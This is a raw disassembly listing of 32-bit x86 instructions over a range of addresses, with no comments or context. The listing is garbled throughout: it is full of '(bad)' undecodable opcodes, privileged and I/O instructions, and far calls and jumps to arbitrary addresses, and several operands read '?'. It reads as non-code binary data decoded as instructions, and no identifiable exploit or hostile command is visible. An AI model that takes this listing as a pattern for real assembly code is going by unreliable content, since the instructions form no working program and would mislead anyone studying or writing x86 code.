  531ba5:	and    BYTE PTR [edx+0x3],ah
  531ba8:	jnp    0x531c22
  531baa:	mov    eax,0x2435512b
  531baf:	mov    ah,0xa2
  531bb1:	and    eax,0x96029ccc
  531bb6:	inc    edx
  531bb7:	mov    DWORD PTR [esi-0x5f1c163e],edi
  531bbd:	jo     0x531bc4
  531bbf:	iret   
  531bc0:	xchg   edi,eax
  531bc1:	repnz adc BYTE PTR [ebx+edi*8+0x43],al
  531bc6:	es sti 
  531bc8:	add    bl,BYTE PTR [edx+0x27bb1fc9]
  531bce:	(bad)  
  531bcf:	cld    
  531bd0:	xor    DWORD PTR [edx-0x508e6f29],esi
  531bd6:	mov    esi,0xde48ba9c
  531bdb:	push   esp
  531bdc:	sub    al,0xca
  531bde:	ja     0x531be4
  531be0:	rcl    BYTE PTR [edi-0x4c],cl
  531be3:	xor    ebp,DWORD PTR [ebx]
  531be5:	mov    ch,0xc9
  531be7:	ins    DWORD PTR es:[edi],dx
  531be8:	cld    
  531be9:	dec    ecx
  531bea:	gs xchg ecx,eax
  531bec:	pop    edx
  531bed:	pop    ebx
  531bee:	mov    DWORD PTR [ebp-0x45d43f4c],ebx
  531bf4:	stos   DWORD PTR es:[edi],eax
  531bf5:	int3   
  531bf6:	(bad)  
  531bf7:	stc    
  531bf8:	sub    DWORD PTR [esi],edi
  531bfa:	pop    es
  531bfb:	inc    ecx
  531bfc:	push   ecx
  531bfd:	in     al,0x22
  531bff:	dec    ecx
  531c00:	iret   
  531c01:	mov    ebx,0xb0461073
  531c06:	mov    ds:0x2bb638ad,al
  531c0b:	sbb    bl,BYTE PTR [ebx+0x29e7cd8c]
  531c11:	punpckldq mm1,DWORD PTR ds:0xb182255a
  531c18:	sub    ebx,ecx
  531c1a:	test   DWORD PTR [esi],0x354ec04d
  531c20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  531c21:	cmc    
  531c22:	and    ch,BYTE PTR [edx+0x2f]
  531c25:	es sbb eax,0x4d481b38
  531c2b:	cli    
  531c2c:	pop    esp
  531c2d:	sub    al,0x7d
  531c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  531c30:	lock std 
  531c32:	shl    BYTE PTR [edx-0x57],0x6e
  531c36:	add    eax,0x62fc049a
  531c3b:	lods   al,BYTE PTR ds:[esi]
  531c3c:	vmwrite edi,DWORD PTR [ebx+0xbfbd943]
  531c43:	push   esp
  531c44:	loopne 0x531c49
  531c46:	js     0x531c2e
  531c48:	lea    ebp,[ebp-0x5d7317b7]
  531c4e:	fsubp  st(7),st
  531c50:	or     ebp,edx
  531c52:	pop    eax
  531c53:	sbb    eax,0xb12ff6f5
  531c58:	xchg   ecx,eax
  531c59:	xchg   ebx,eax
  531c5a:	(bad)  
  531c5b:	int    0xc9
  531c5d:	xlat   BYTE PTR ds:[ebx]
  531c5e:	retf   0x8926
  531c61:	jno    0x531c93
  531c63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  531c64:	mov    edx,eax
  531c66:	cwde   
  531c67:	xchg   dl,ch
  531c69:	ficom  WORD PTR [ebx-0x75]
  531c6c:	and    eax,0xe297ef53
  531c71:	imul   edx,DWORD PTR [ebx],0x54
  531c74:	jns    0x531c4a
  531c76:	push   edi
  531c77:	cli    
  531c78:	add    al,0xcf
  531c7a:	sub    DWORD PTR ss:[edi-0x40],esi
  531c7e:	cwd    
  531c80:	push   es
  531c81:	push   esp
  531c82:	sub    eax,0x7db9b070
  531c87:	mov    WORD PTR [ebx+0x72],ss
  531c8a:	imul   edx,DWORD PTR [esi],0xffffffe9
  531c8d:	sub    al,0x45
  531c8f:	adc    BYTE PTR [eax+0x1d],cl
  531c92:	adc    esp,DWORD PTR [ebp+eax*2-0x5f967324]
  531c99:	xor    al,BYTE PTR [ebx]
  531c9b:	ror    BYTE PTR [ebx-0x67],cl
  531c9e:	daa    
  531c9f:	push   es
  531ca0:	push   cs
  531ca1:	mov    dh,0x22
  531ca3:	pop    eax
  531ca4:	out    0xfe,al
  531ca6:	sbb    al,BYTE PTR [esi+0x107bb6b6]
  531cac:	imul   edx,ebp,0x3d657095
  531cb2:	mov    cl,0xe9
  531cb4:	cmc    
  531cb5:	mov    gs,WORD PTR [ecx-0x33]
  531cb8:	mov    edi,esp
  531cba:	fcomp  st(2)
  531cbc:	pop    ecx
  531cbd:	jge    0x531c72
  531cbf:	add    DWORD PTR [edi+0x7e710987],edx
  531cc5:	push   0x71187218
  531cca:	mov    BYTE PTR [eax+0x1e],al
  531ccd:	sbb    al,dl
  531ccf:	and    eax,0x2f07f47c
  531cd4:	jns    0x531c8a
  531cd6:	mov    al,ds:0x621efa40
  531cdb:	scas   eax,DWORD PTR es:[edi]
  531cdc:	or     al,0xf9
  531cde:	xchg   edi,eax
  531cdf:	icebp  
  531ce0:	ds inc edi
  531ce2:	and    DWORD PTR [ebx-0x69],esi
  531ce5:	outs   dx,BYTE PTR ds:[esi]
  531ce6:	add    al,0xe6
  531ce8:	lahf   
  531ce9:	inc    esp
  531cea:	shr    BYTE PTR [edi],1
  531cec:	dec    esp
  531ced:	dec    esp
  531cee:	inc    si
  531cf0:	add    ecx,0xd637bf59
  531cf6:	neg    BYTE PTR [ebp-0x3e]
  531cf9:	ret    0xa5fb
  531cfc:	add    eax,0x3b2d5e03
  531d01:	xchg   esi,eax
  531d02:	or     al,0x1
  531d04:	pop    edi
  531d05:	or     edx,ebx
  531d07:	in     eax,0x4c
  531d09:	add    eax,0x823ef859
  531d0e:	ss mov bl,0x9f
  531d11:	inc    edx
  531d12:	dec    ecx
  531d13:	push   0xffffffdd
  531d15:	cmc    
  531d16:	jno    0x531d3e
  531d18:	push   edx
  531d19:	sbb    ebp,ecx
  531d1b:	call   0xe2bc:0x4040cc77
  531d22:	jle    0x531cb4
  531d24:	mul    BYTE PTR [edi-0x2d]
  531d27:	scas   eax,DWORD PTR es:[edi]
  531d28:	out    dx,eax
  531d29:	adc    al,0xf
  531d2b:	mov    ebx,DWORD PTR [ebx]
  531d2d:	add    eax,ecx
  531d2f:	das    
  531d30:	es push 0xfffffff1
  531d33:	out    0x30,al
  531d35:	mov    ah,0xe
  531d37:	test   DWORD PTR [edi+0x571f90ff],edx
  531d3d:	in     al,0x3f
  531d3f:	and    al,0xbf
  531d41:	int3   
  531d42:	mov    al,0x9f
  531d44:	in     al,dx
  531d45:	je     0x531d49
  531d47:	dec    edx
  531d48:	gs (bad) 
  531d4a:	sbb    bl,BYTE PTR [edi+0x54afce13]
  531d50:	sub    al,BYTE PTR [eax]
  531d52:	mov    ah,0x55
  531d54:	xchg   ebx,eax
  531d55:	add    edi,DWORD PTR [edx]
  531d57:	fstp   DWORD PTR [ebp-0xd]
  531d5a:	jge    0x531dc9
  531d5c:	fnstcw WORD PTR [eax]
  531d5e:	fisttp WORD PTR [ecx]
  531d60:	(bad)  
  531d61:	ds push esp
  531d63:	(bad)  
  531d64:	cli    
  531d65:	pop    es
  531d66:	out    0x67,eax
  531d68:	fs aad 0xbf
  531d6b:	push   ss
  531d6c:	std    
  531d6d:	and    ebx,esi
  531d6f:	add    al,0xdc
  531d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  531d72:	fadd   QWORD PTR [ebx]
  531d74:	sub    DWORD PTR [ebx],ebx
  531d76:	loope  0x531d96
  531d78:	fs inc esi
  531d7a:	mov    dl,0x9e
  531d7c:	inc    esi
  531d7d:	imul   edi,DWORD PTR [edx],0xaf852fef
  531d83:	outs   dx,BYTE PTR ds:[esi]
  531d84:	pop    eax
  531d85:	mov    edi,0x86cef93e
  531d8a:	xlat   BYTE PTR ds:[ebx]
  531d8b:	dec    DWORD PTR [ebx]
  531d8d:	sar    eax,1
  531d8f:	pushf  
  531d90:	xchg   ebx,eax
  531d91:	and    BYTE PTR [ecx-0x47],bh
  531d94:	fisub  DWORD PTR [edi+0x25]
  531d97:	mov    bl,0x68
  531d99:	int    0x5e
  531d9b:	dec    eax
  531d9c:	xlat   BYTE PTR ds:[ebx]
  531d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  531d9e:	sbb    eax,0x829216f3
  531da3:	add    eax,0x919ea189
  531da8:	ret    0x4977
  531dab:	pop    edi
  531dac:	dec    ebx
  531dad:	or     eax,ebp
  531daf:	lds    esi,FWORD PTR [ecx]
  531db1:	clc    
  531db2:	stos   DWORD PTR es:[edi],eax
  531db3:	stos   DWORD PTR es:[edi],eax
  531db4:	test   al,0xd6
  531db6:	xor    al,0xce
  531db8:	into   
  531db9:	ins    DWORD PTR es:[edi],dx
  531dba:	stos   DWORD PTR es:[edi],eax
  531dbb:	outs   dx,BYTE PTR ds:[esi]
  531dbc:	pmulhw mm6,QWORD PTR [edi+ecx*8+0x6b5a9890]
  531dc4:	int    0x66
  531dc6:	inc    edi
  531dc7:	and    BYTE PTR [esi+0x22bc439a],0x3d
  531dce:	and    al,0xb
  531dd0:	sub    edi,DWORD PTR [eax-0x67]
  531dd3:	pusha  
  531dd4:	fdivr  QWORD PTR [edi+0x285f1911]
  531dda:	(bad)  
  531ddb:	xor    ebp,ebx
  531ddd:	xchg   DWORD PTR [edi-0x13],ebp
  531de0:	mov    BYTE PTR [ebx],al
  531de2:	adc    eax,0xc3f9eb32
  531de7:	and    al,0xd0
  531de9:	cwde   
  531dea:	es cmp bl,BYTE PTR es:[esi+eiz*8]
  531def:	aam    0xb8
  531df1:	popa   
  531df2:	adc    DWORD PTR [esp+eiz*2-0x5a31fd57],esi
  531df9:	mov    edi,0x6e421fd6
  531dfe:	jecxz  0x531dbd
  531e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  531e01:	(bad)  
  531e02:	jbe    0x531e58
  531e04:	fistp  WORD PTR ds:0xeeee1d0d
  531e0a:	sti    
  531e0b:	daa    
  531e0c:	fist   WORD PTR [edi-0x6e]
  531e0f:	mov    eax,ds:0xb7d1c991
  531e14:	in     eax,dx
  531e15:	xchg   ebx,eax
  531e16:	iret   
  531e17:	pop    esi
  531e18:	jne    0x531d9d
  531e1a:	sar    DWORD PTR [esi-0x7f3a3c09],cl
  531e20:	inc    ecx
  531e21:	dec    ecx
  531e22:	adc    eax,0x3cfffecb
  531e27:	into   
  531e28:	es das 
  531e2a:	push   ebx
  531e2b:	jg     0x531e1d
  531e2d:	stos   DWORD PTR es:[edi],eax
  531e2e:	add    ah,BYTE PTR [edi+0x7ace752b]
  531e34:	icebp  
  531e35:	or     dl,ah
  531e37:	cmp    eax,0xf903dc20
  531e3c:	inc    esi
  531e3d:	push   0xffffffe2
  531e3f:	xchg   ebp,eax
  531e40:	push   esi
  531e41:	pop    edx
  531e42:	mov    edi,0xec0c7d07
  531e47:	mov    cl,0x3e
  531e49:	mov    dh,0x34
  531e4b:	pop    ebp
  531e4c:	imul   ebx,edx,0xffffffce
  531e4f:	(bad)
  531e52:	push   ds
  531e53:	mov    ds:0xd7e24732,eax
  531e58:	(bad)  
  531e59:	rcr    bh,1
  531e5b:	mov    eax,?
  531e5d:	outs   dx,BYTE PTR ds:[esi]
  531e5e:	scas   eax,DWORD PTR es:[edi]
  531e5f:	cwde   
  531e60:	pop    ss
  531e61:	gs icebp 
  531e63:	adc    BYTE PTR [eax+edx*2-0x2410bbdd],cl
  531e6a:	adc    esp,DWORD PTR [edi+0x32e7cf82]
  531e70:	retw   0x9144
  531e74:	adc    al,BYTE PTR [ebx]
  531e76:	dec    esi
  531e77:	mov    bh,0x5c
  531e79:	fsub   QWORD PTR [ecx]
  531e7b:	fiadd  DWORD PTR [eax+0x5c]
  531e7e:	ror    ch,1
  531e80:	jg     0x531e7f
  531e82:	js     0x531e9e
  531e84:	xchg   DWORD PTR [ecx+0x30],esi
  531e87:	mov    ebx,0x62eda3c0
  531e8c:	aas    
  531e8d:	mov    BYTE PTR [ebp+0x78],cl
  531e90:	jne    0x531e21
  531e92:	xchg   ebx,eax
  531e93:	mov    BYTE PTR [ecx-0x3d],ch
  531e96:	xchg   edi,eax
  531e97:	push   edx
  531e98:	jbe    0x531ebe
  531e9a:	shl    DWORD PTR [edi-0x10a26a96],1
  531ea0:	xor    eax,edx
  531ea2:	mov    DWORD PTR ds:0x9729b987,ebp
  531ea8:	xlat   BYTE PTR ds:[ebx]
  531ea9:	rcl    BYTE PTR ds:0xabebac38,0xa5
  531eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  531eb1:	add    ebx,DWORD PTR [ebp+0x10]
  531eb4:	inc    edi
  531eb5:	test   DWORD PTR [esi],esp
  531eb7:	sahf   
  531eb8:	mov    es,WORD PTR [ecx]
  531eba:	mov    esp,0x1d4783d9
  531ebf:	xchg   esp,eax
  531ec0:	shl    DWORD PTR [esi+edx*2-0x305e9f89],1
  531ec7:	jecxz  0x531ea1
  531ec9:	xchg   esp,eax
  531eca:	test   BYTE PTR [ebx],dh
  531ecc:	out    dx,al
  531ecd:	mov    ebp,0xb2b2faad
  531ed2:	(bad)  
  531ed3:	(bad)  
  531ed4:	loope  0x531f28
  531ed6:	cld    
  531ed7:	xchg   BYTE PTR [edi+0x74],bl
  531eda:	into   
  531edb:	shl    DWORD PTR [edx-0x56],0x21
  531edf:	dec    esi
  531ee0:	(bad)  
  531ee1:	rcl    DWORD PTR [edi-0x24c655ff],1
  531ee7:	mov    dh,0x92
  531ee9:	out    dx,al
  531eea:	pop    esp
  531eeb:	repz sub DWORD PTR [edx-0x2fa8373c],esi
  531ef2:	cld    
  531ef3:	clc    
  531ef4:	leave  
  531ef5:	sub    eax,0xf602660b
  531efa:	and    eax,0x911acfbe
  531eff:	mov    edi,0x41b26100
  531f04:	fwait
  531f05:	out    dx,eax
  531f06:	adc    DWORD PTR [edx],edi
  531f08:	cmp    al,0x8a
  531f0a:	sar    cl,cl
  531f0c:	div    DWORD PTR [esi+0x547a6836]
  531f12:	ret    
  531f13:	lea    edi,[edi-0x7f]
  531f16:	xchg   esi,eax
  531f17:	fimul  WORD PTR [ecx+0x79]
  531f1a:	mov    al,0x2
  531f1c:	add    ebp,DWORD PTR [edx-0x63]
  531f1f:	imul   ecx,DWORD PTR [edi-0x47],0xfffffff6
  531f23:	jns    0x531ee5
  531f25:	add    al,0x68
  531f27:	sbb    eax,0x85c8f6e4
  531f2c:	xor    ebx,ebx
  531f2e:	(bad)  
  531f2f:	xor    esi,edi
  531f31:	adc    esp,DWORD PTR [edi-0x1c88e82]
  531f37:	data16 adc ah,ch
  531f3a:	fdiv   DWORD PTR [esi-0x5c]
  531f3d:	push   edx
  531f3e:	(bad)  
  531f3f:	ret    
  531f40:	push   ebx
  531f41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  531f42:	aaa    
  531f43:	push   eax
  531f44:	repnz shl dh,1
  531f47:	mov    cs,WORD PTR [ebp-0x6c]
  531f4a:	pop    es
  531f4b:	sub    al,0xf3
  531f4d:	fs mov ah,0x4f
  531f50:	sbb    al,0x8e
  531f52:	and    esp,DWORD PTR ss:[ecx+0x37e92e01]
  531f59:	or     eax,0x3baae680
  531f5e:	pop    esp
  531f5f:	add    BYTE PTR [ecx-0x60],al
  531f62:	xchg   ebx,eax
  531f63:	cld    
  531f64:	out    dx,eax
  531f65:	sbb    al,0xef
  531f67:	(bad)  
  531f69:	in     al,dx
  531f6a:	pop    es
  531f6b:	jnp    0x531ef5
  531f6d:	mov    ecx,0xe515e545
  531f72:	inc    edi
  531f73:	pop    ecx
  531f74:	cmp    BYTE PTR [ebx+eax*8],ah
  531f77:	mov    esi,0xd1161742
  531f7c:	or     edi,ecx
  531f7e:	xlat   BYTE PTR ds:[ebx]
  531f7f:	out    0x0,al
  531f81:	stos   BYTE PTR es:[edi],al
  531f82:	cs jp  0x531ff9
  531f85:	xchg   ebx,eax
  531f86:	and    bh,dh
  531f88:	adc    ebp,DWORD PTR [edx-0x1e]
  531f8b:	leave  
  531f8c:	mov    dl,0xc3
  531f8e:	fdivr  st(0),st
  531f90:	sbb    edx,edx
  531f92:	dec    ebx
  531f93:	imul   edx,DWORD PTR [edx-0x6e142092],0x14040cbd
  531f9d:	xchg   ecx,eax
  531f9e:	or     BYTE PTR [ecx],ah
  531fa0:	mov    ss,WORD PTR [edx-0x6e3d16fc]
  531fa6:	repz mov esi,0x261ae219
  531fac:	mov    edi,0xdcbfb50b
  531fb1:	sbb    esp,eax
  531fb3:	(bad)  
  531fb4:	in     al,0x58
  531fb6:	pushf  
  531fb7:	pop    ecx
  531fb8:	pop    ebx
  531fb9:	add    eax,DWORD PTR [edi-0x38a1ee24]
  531fbf:	sbb    ecx,eax
  531fc1:	arpl   cx,bp
  531fc3:	lea    esp,fs:[edx]
  531fc6:	xor    DWORD PTR [ecx+edi*2+0x647330ae],ebp
  531fcd:	mov    ah,0x93
  531fcf:	dec    edi
  531fd0:	push   es
  531fd1:	add    eax,ebp
  531fd3:	imul   ecx,DWORD PTR [edi+0x2b7710e6],0xffffffaa
  531fda:	shl    BYTE PTR [edx+edx*1+0x6a],1
  531fde:	mov    es,WORD PTR [edi]
  531fe0:	pop    es
  531fe1:	push   cs
  531fe2:	or     DWORD PTR [esi+0x37c7d6c0],0xd45fc8a
  531fec:	pop    ebx
  531fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  531fee:	jne    0x531f94
  531ff0:	aaa    
  531ff1:	jnp    0x531fb0
  531ff3:	jp     0x531feb
  531ff5:	fcomp  st(0)
  531ff7:	leave  
  531ff8:	xor    DWORD PTR [ecx+ebp*8+0x329da576],ecx
  531fff:	sti    
  532000:	xor    al,0x52
  532002:	push   ebp
  532003:	dec    ecx
  532004:	push   es
  532005:	gs push edi
  532007:	rcl    DWORD PTR [eax+edx*4+0x2361d774],1
  53200e:	mov    ecx,0xfe4eb0c5
  532013:	pushf  
  532014:	inc    eax
  532015:	jmp    0xbb60e40e
  53201a:	push   esi
  53201b:	add    eax,0xe51778d5
  532020:	xchg   dh,dl
  532022:	imul   esp,DWORD PTR [eax-0x60],0x23
  532026:	test   DWORD PTR [bp+si+0x2b],esi
  53202a:	cmp    edi,DWORD PTR [ecx-0x7a6240d7]
  532030:	jle    0x53202e
  532032:	mov    es,WORD PTR [ebp-0x65]
  532035:	dec    esi
  532036:	sbb    BYTE PTR [esp+eax*4+0x62b893b4],bh
  53203d:	mov    dl,0xb5
  53203f:	mov    al,ds:0xb3a3f70e
  532044:	outs   dx,DWORD PTR ds:[esi]
  532045:	sbb    DWORD PTR [esi+0x43],eax
  532048:	jnp    0x53203f
  53204a:	into   
  53204b:	inc    esp
  53204c:	inc    esi
  53204d:	xchg   esi,eax
  53204e:	pop    esp
  53204f:	jle    0x532008
  532051:	hlt    
  532052:	xchg   edx,eax
  532053:	jle    0x532089
  532055:	aad    0x65
  532057:	neg    BYTE PTR [esi-0xf]
  53205a:	push   ecx
  53205b:	int    0x8
  53205d:	sbb    dl,BYTE PTR ds:0xf66f2b91
  532063:	xchg   esp,eax
  532064:	xor    edx,DWORD PTR [eax]
  532066:	mov    ebp,0xc540c3da
  53206b:	jb     0x53208a
  53206d:	push   cs
  53206e:	jo     0x53207d
  532070:	fst    st(7)
  532072:	jecxz  0x5320b6
  532074:	xchg   esp,eax
  532075:	cmc    
  532076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  532077:	inc    esi
  532078:	sub    BYTE PTR [esi],dl
  53207a:	(bad)  
  53207b:	pushf  
  53207c:	xlat   BYTE PTR ds:[ebx]
  53207d:	out    dx,eax
  53207e:	mov    ebp,0xef09b20
  532083:	inc    eax
  532084:	(bad)  
  532085:	jmp    0x4c8c:0x2201899d
  53208c:	mov    esi,0xfe760bbc
  532091:	adc    eax,0x3e4bceda
  532096:	xchg   esp,eax
  532097:	loopne 0x532091
  532099:	push   ecx
  53209a:	sbb    ebx,DWORD PTR [eax-0x72f19f86]
  5320a0:	pop    esp
  5320a1:	xor    ebx,ebx
  5320a3:	outs   dx,BYTE PTR ds:[esi]
  5320a4:	and    ebp,edx
  5320a6:	cmp    bl,cl
  5320a8:	(bad)  
  5320a9:	outs   dx,DWORD PTR ds:[esi]
  5320aa:	mov    edx,0x879ddb7c
  5320af:	push   ebx
  5320b0:	int    0x42
  5320b2:	mov    bl,0x52
  5320b4:	shl    BYTE PTR [ecx],cl
  5320b6:	int    0xca
  5320b8:	fist   DWORD PTR [esi]
  5320ba:	cmp    esp,DWORD PTR [ebx-0x3e]
  5320bd:	push   ss
  5320be:	shl    bl,cl
  5320c0:	xchg   ebp,eax
  5320c1:	sbb    edi,DWORD PTR [eax]
  5320c3:	test   BYTE PTR [esi-0xd],al
  5320c6:	push   ebx
  5320c7:	stos   BYTE PTR es:[edi],al
  5320c8:	clc    
  5320c9:	pop    es
  5320ca:	repz cmp eax,0x263791a1
  5320d0:	out    dx,al
  5320d1:	jl     0x53206a
  5320d3:	jg     0x5320bb
  5320d5:	frstor [ecx-0x479115d0]
  5320db:	pushf  
  5320dc:	sub    BYTE PTR [ecx+0x7c],dh
  5320df:	outs   dx,DWORD PTR ds:[esi]
  5320e0:	sbb    ch,cl
  5320e2:	sti    
  5320e3:	xchg   ebp,eax
  5320e4:	xor    DWORD PTR [edx],esi
  5320e6:	icebp  
  5320e7:	cmp    cl,BYTE PTR [eax-0x3e54312d]
  5320ed:	xor    eax,0x3041fa4d
  5320f2:	jge    0x532080
  5320f4:	test   ebp,ecx
  5320f6:	out    dx,al
  5320f7:	push   esi
  5320f8:	inc    eax
  5320f9:	cmp    DWORD PTR [ebp-0x11],ebp
  5320fc:	cs pusha 
  5320fe:	cwde   
  5320ff:	or     BYTE PTR ds:0xabd2487a,ah
  532105:	dec    esp
  532106:	std    
  532107:	sbb    cl,al
  532109:	out    dx,al
  53210a:	cld    
  53210b:	call   0x4f9cb16c
  532110:	ret    0x43cd
  532113:	pop    eax
  532114:	int3   
  532115:	inc    eax
  532116:	ins    DWORD PTR es:[edi],dx
  532117:	rcl    WORD PTR [edi+0x1],0xf7
  53211c:	in     eax,0x9d
  53211e:	jb     0x5320e7
  532120:	(bad)
  532123:	mov    bl,0x99
  532125:	retf   0x4dd4
  532128:	push   edi
  532129:	stc    
  53212a:	je     0x532166
  53212c:	fs pusha 
  53212e:	stos   BYTE PTR es:[edi],al
  53212f:	ja     0x5321a3
  532131:	xchg   esp,eax
  532132:	xor    ah,BYTE PTR [esp+eax*1-0x24]
  532136:	in     al,0xa3
  532138:	mov    al,0x4a
  53213a:	mov    dl,0xa9
  53213c:	scas   al,BYTE PTR es:[edi]
  53213d:	pop    ebx
  53213e:	or     dh,BYTE PTR [eax+eiz*4-0x1a5c6e5e]
  532145:	fcmovne st,st(2)
  532147:	pop    esi
  532148:	jl     0x53213e
  53214a:	push   esi
  53214b:	xor    eax,0x29f3e9ae
  532150:	std    
  532151:	ret    
  532152:	push   ds
  532153:	fldenv [edx]
  532155:	mov    cl,BYTE PTR [ebx]
  532157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  532158:	push   edx
  532159:	or     edi,DWORD PTR [ebp-0x7e29f18c]
  53215f:	pushf  
  532160:	imul   ebp,DWORD PTR [edx+0x192b0f6d],0x0
  532167:	inc    edi
  532168:	mov    edx,?
  53216a:	sbb    DWORD PTR [ecx+0xa],ecx
  53216d:	sub    ch,BYTE PTR [eax+0x297b3bee]
  532173:	pop    ss
  532174:	fwait
  532175:	inc    edx
  532176:	jo     0x53212f
  532178:	gs and al,0xe7
  53217b:	(bad)  
  53217c:	jecxz  0x5321d4
  53217e:	int3   
  53217f:	push   esp
  532180:	and    ch,ah
  532182:	sub    edi,DWORD PTR [ebp-0xb]
  532185:	repz pushf 
  532187:	mov    al,ds:0xdd3bff06
  53218c:	xor    BYTE PTR [ebp+0x72e56336],ah
  532192:	lock (bad) 
  532194:	clc    
  532195:	xchg   edi,eax
  532196:	fxch   st(0)
  532198:	dec    eax
  532199:	jns    0x5321fa
  53219b:	aaa    
  53219c:	imul   ebp,DWORD PTR [eax+0x45],0xffffffde
  5321a0:	pop    ds
  5321a1:	fstp   DWORD PTR ds:[ebp-0x223020a2]
  5321a8:	mov    ds:0x4746fe16,al
  5321ad:	mov    dl,0x11
  5321af:	cmp    al,0x68
  5321b1:	lods   eax,DWORD PTR ds:[esi]
  5321b2:	das    
  5321b3:	call   0x9276:0x4fc8671c
  5321ba:	ds push ebp
  5321bc:	cs add eax,0x2cedfd0d
  5321c2:	sar    BYTE PTR [eax],0x5e
  5321c5:	and    al,0x85
  5321c7:	iret   
  5321c8:	mov    ebp,0xff1ea13a
  5321cd:	out    0x50,al
  5321cf:	icebp  
  5321d0:	call   FWORD PTR [eax+0x879f304]
  5321d6:	aaa    
  5321d7:	ins    BYTE PTR es:[edi],dx
  5321d8:	adc    al,0x2
  5321da:	std    
  5321db:	and    DWORD PTR [edi],edi
  5321dd:	mov    dh,0x56
  5321df:	pop    edx
  5321e0:	jb     0x532206
  5321e2:	mov    dl,0x90
  5321e4:	addr16 (bad) 
  5321e6:	mov    ebp,0x49598258
  5321eb:	stos   DWORD PTR es:[edi],eax
  5321ec:	(bad)  
  5321ed:	and    bl,bl
  5321ef:	adc    DWORD PTR [ebp+0x4f],ebp
  5321f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5321f3:	mov    bl,0xc7
  5321f5:	ja     0x53220b
  5321f7:	inc    esi
  5321f8:	arpl   WORD PTR [ebx+0x6],sp
  5321fb:	test   al,0x7d
  5321fd:	adc    DWORD PTR [ebx+0x10],ecx
  532200:	sti    
  532201:	xchg   edi,eax
  532202:	mov    edx,0x948c5d9d
  532207:	and    DWORD PTR [ebx+0x56d51551],ebp
  53220d:	iret   
  53220e:	pop    ebp
  53220f:	test   BYTE PTR [ebx+ebx*2+0x3d942587],dh
  532216:	iret   
  532217:	mov    ds:0x28a92637,eax
  53221c:	xchg   esp,eax
  53221d:	mov    bl,0x31
  53221f:	adc    dh,ah
  532221:	jns    0x5321b7
  532223:	in     al,0x56
  532225:	dec    edx
  532226:	jecxz  0x5321e4
  532228:	xchg   edi,eax
  532229:	cmp    al,0xa0
  53222b:	jl     0x5321fd
  53222d:	dec    ecx
  53222e:	lea    edx,[eax]
  532230:	sahf   
  532231:	xchg   esi,eax
  532232:	dec    esi
  532233:	ja     0x5321da
  532235:	pop    ecx
  532236:	and    esp,edi
  532238:	xor    eax,0x82fed7fe
  53223d:	jl     0x5322a3
  53223f:	rol    ch,0x14
  532242:	jbe    0x5322ba
  532244:	mov    bh,0x30
  532246:	into   
  532247:	xor    eax,0xa79ce48d
  53224c:	pop    edx
  53224d:	inc    eax
  53224e:	pop    esi
  53224f:	scas   eax,DWORD PTR es:[edi]
  532250:	or     edi,DWORD PTR [edx]
  532252:	repz push ecx
  532255:	pop    es
  532256:	shl    DWORD PTR [eax],1
  532258:	xchg   edi,eax
  532259:	mov    al,0x4b
  53225b:	pop    ds
  53225c:	xchg   ecx,eax
  53225d:	lods   al,BYTE PTR ds:[esi]
  53225e:	rcr    BYTE PTR [ebx],0x40
  532261:	fwait
  532262:	add    al,0x96
  532264:	add    edx,edx
  532266:	pop    edx
  532267:	xchg   ecx,eax
  532268:	mov    esi,0x862d30c7
  53226d:	or     BYTE PTR [ecx],0x78
  532270:	stos   BYTE PTR es:[edi],al
  532271:	inc    esi
  532272:	cmp    DWORD PTR [ecx-0x50],edx
  532275:	inc    edx
  532276:	xchg   edi,eax
  532277:	mov    ds:0x77d5dcce,eax
  53227c:	adc    bl,dl
  53227e:	stos   DWORD PTR es:[edi],eax
  53227f:	stos   BYTE PTR es:[edi],al
  532280:	sub    DWORD PTR [ebx-0x3d],esp
  532283:	cmp    eax,0xe74f1068
  532288:	inc    ebx
  532289:	xor    BYTE PTR [edi],ch
  53228b:	enter  0xc65f,0x15
  53228f:	push   0xc2d96e61
  532294:	pushf  
  532295:	mov    dl,0xf1
  532297:	jle    0x5322cb
  532299:	pop    esp
  53229a:	iret   
  53229b:	fiadd  WORD PTR [edi-0x72]
  53229e:	test   DWORD PTR ds:0x3061b71,esp
  5322a4:	mov    eax,0x100b4660
  5322a9:	imul   esi,DWORD PTR [ebp*4+0x7167616d],0xffffffac
  5322b1:	sub    DWORD PTR [ecx+ecx*4],0xffffff9d
  5322b5:	jl     0x532287
  5322b7:	lods   al,BYTE PTR ds:[esi]
  5322b8:	test   bl,bl
  5322ba:	fmulp  st(2),st
  5322bc:	mov    ds:0x659ef848,al
  5322c1:	mov    bh,0x1f
  5322c3:	aad    0x71
  5322c5:	call   0xa0521c12
  5322ca:	jbe    0x53232f
  5322cc:	mov    cl,0x4c
  5322ce:	xor    bh,cl
  5322d0:	es mov esi,edx
  5322d3:	dec    esp
  5322d4:	dec    eax
  5322d5:	icebp  
  5322d6:	xlat   BYTE PTR ds:[ebx]
  5322d7:	push   eax
  5322d8:	lahf   
  5322d9:	cwde   
  5322da:	sar    BYTE PTR [ecx-0x68c8589d],cl
  5322e0:	inc    ecx
  5322e1:	mov    al,0x27
  5322e3:	xchg   edi,eax
  5322e4:	inc    DWORD PTR [ebx+ecx*4-0x33]
  5322e8:	cmc    
  5322e9:	lods   eax,DWORD PTR ds:[esi]
  5322ea:	call   0x18d572e7
  5322ef:	pusha  
  5322f0:	xor    DWORD PTR [esi],0xc6280ba6
  5322f6:	mov    ds:0xcfc87524,al
  5322fb:	sbb    DWORD PTR [edx],esp
  5322fd:	data16 cmp dh,BYTE PTR [eax-0x50]
  532301:	or     eax,0x521b9b73
  532306:	inc    ebx
  532307:	adc    ch,0xf6
  53230a:	stc    
  53230b:	inc    ebp
  53230c:	inc    ecx
  53230d:	int    0xf5
  53230f:	cmp    cl,ch
  532311:	or     DWORD PTR [edx],ebx
  532313:	outs   dx,BYTE PTR ds:[esi]
  532314:	std    
